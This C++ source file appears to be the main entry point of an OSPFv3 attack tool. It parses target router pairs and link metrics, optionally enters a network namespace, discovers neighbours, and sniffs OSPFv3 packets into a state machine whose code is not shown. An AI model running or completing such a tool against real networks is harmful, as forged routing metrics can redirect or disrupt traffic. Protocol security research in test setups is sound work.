#include <iostream>
#include "pdus/OSPFv3.h"
#include "../spdlog/include/spdlog/sinks/stdout_color_sinks.h"
#include "netns.h"
#include "statemachine.h"
#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>
#include "neighborscan.h"

using namespace Tins;

bool processPacket(const PDU &pdu) {
	auto logger = spdlog::get("capture");
	
	const IPv6 &ip = pdu.rfind_pdu<IPv6>();
	auto ospf = ip.rfind_pdu<pdu::OSPFv3>();
	ospf.updateValues(ip);
	
	logger->trace(ospf.getPacket()->Packet::toString());
	
	statemachine::onPacket(ospf.getPacket());
	
	return true;
}

int attack_main(int argc, char *argv[]) {
	boost::program_options::options_description desc{"Options"};
	desc.add_options()
		("help,h", "Help")
		("netns,n", boost::program_options::value<std::string>(), "Execute in this network namespace.")
		("log,l",
		 boost::program_options::value<typename std::underlying_type<spdlog::level::level_enum>::type>()->default_value(
			 spdlog::level::info), "Loglevel")
		("self,s", boost::program_options::value<std::string>()->default_value("1.1.2.2"), "Who am I?")
		("targets,t", boost::program_options::value<std::vector<std::string>>()->multitoken(), "Who do I attack? Multiple of a,b,metric");
	
	boost::program_options::variables_map vm;
	boost::program_options::store(boost::program_options::parse_command_line(argc, argv, desc), vm);
	boost::program_options::notify(vm);
	
	//Create spdloggers
	for (auto &s : {"main", "netns", "statemachine", "capture", "transmit", "neighbor"}) {
		auto l = spdlog::stdout_color_mt(s);
		l->set_level(
			static_cast<spdlog::level::level_enum>(vm["log"].as<typename std::underlying_type<spdlog::level::level_enum>::type>()));
	}
	
	auto logger = spdlog::get("main");
	std::vector<std::tuple<uint32_t, uint32_t, uint16_t>> targets;
	
	for (auto const& opt : vm["targets"].as<std::vector<std::string>>()) {
		std::vector<std::string> res;
		boost::algorithm::split(res, opt, boost::is_any_of(","));
		targets.emplace_back(parser::byteswap<uint32_t>(Tins::IPv4Address(res[0])), parser::byteswap<uint32_t>(Tins::IPv4Address(res[1])), std::stoi(res[2]));
	}
	
	
	logger->info("Options:");
	if (vm.count("netns"))
		logger->info("  netns: {}", vm["netns"].as<std::string>());
	else
		logger->info("  netns: <none>");
	logger->info("  log level: {}", vm["log"].as<typename std::underlying_type<spdlog::level::level_enum>::type>());
	logger->info("  self router-id: {}", vm["self"].as<std::string>());
	logger->info("  targets:");
	for (auto const& [a,b,metric] : targets) {
		logger->info("    {} <-> {} -> {}", Tins::IPv4Address(parser::byteswap(a)).to_string(), Tins::IPv4Address(parser::byteswap(b)).to_string(), metric);
	}
	
	if (vm.count("netns")) {
		netns::enter(vm["netns"].as<std::string>());
	}
	
	neighborscan::discoverNeighbors();
	
	statemachine::init(parser::byteswap<uint32_t>(Tins::IPv4Address(vm["self"].as<std::string>())), targets);
	
	logger->info("Setting up sniffer...");
	Allocators::register_allocator<IPv6, pdu::OSPFv3>(0x59);
	Sniffer sniffer("any");
	
	logger->info("Starting sniffer...");
	sniffer.sniff_loop(processPacket);
	return 0;
}
